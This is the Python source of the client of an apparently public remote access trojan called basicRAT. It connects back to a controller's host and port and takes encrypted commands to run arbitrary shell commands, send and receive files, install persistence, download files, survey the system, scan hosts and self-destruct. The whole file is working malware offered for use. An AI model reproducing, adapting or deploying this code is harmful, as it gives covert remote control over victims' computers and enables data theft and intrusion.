#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import subprocess
import sys

from core import common
from core import crypto
from core import persistence
from core import scan
from core import survey
from core import toolkit


# change these to suit your needs
HOST = 'localhost'
PORT = 1337


def main():
    conn = socket.socket()
    conn.connect((HOST, PORT))
    client = common.Client(conn, HOST, 1)

    while True:
        results = ''

        # wait to receive data from server
        data = client.recvGCM()

        # don't process empty data
        if not data:
            continue

        # seperate prompt into command and action
        cmd, _, action = data.partition(' ')

        # kill client
        if cmd == 'kill':
            conn.close()
            sys.exit(0)

        # regenerate DH key
        # elif cmd == 'rekey':
        #    client.dh_key = crypto.diffiehellman(client.conn)
        #    continue

        # run a command
        elif cmd == 'execute':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()

        elif cmd == 'download':
            client.sendfile(action.rstrip())
            continue

        elif cmd == 'upload':
            client.recvfile(action.rstrip())
            continue

        elif cmd == 'persistence':
            results = persistence.run(plat)
            if 'unsuccessful' not in results:
                persistence_applied = True

        elif cmd == 'wget':
            results = toolkit.wget(action)

        elif cmd == 'unzip':
            results = toolkit.unzip(action)

        elif cmd == 'survey':
            results = survey.run(plat)

        elif cmd == 'scan':
            results = scan.single_host(action)

        elif cmd == 'selfdestruct':
            conn.close()
            toolkit.selfdestruct(plat)

        client.sendGCM(results)


if __name__ == '__main__':
    plat = sys.platform
    if plat.startswith('win'):
        plat = 'win'
    elif plat.startswith('linux'):
        plat = 'nix'
    elif plat.startswith('darwin'):
        plat = 'mac'
    else:
        plat = 'unk'

    main()
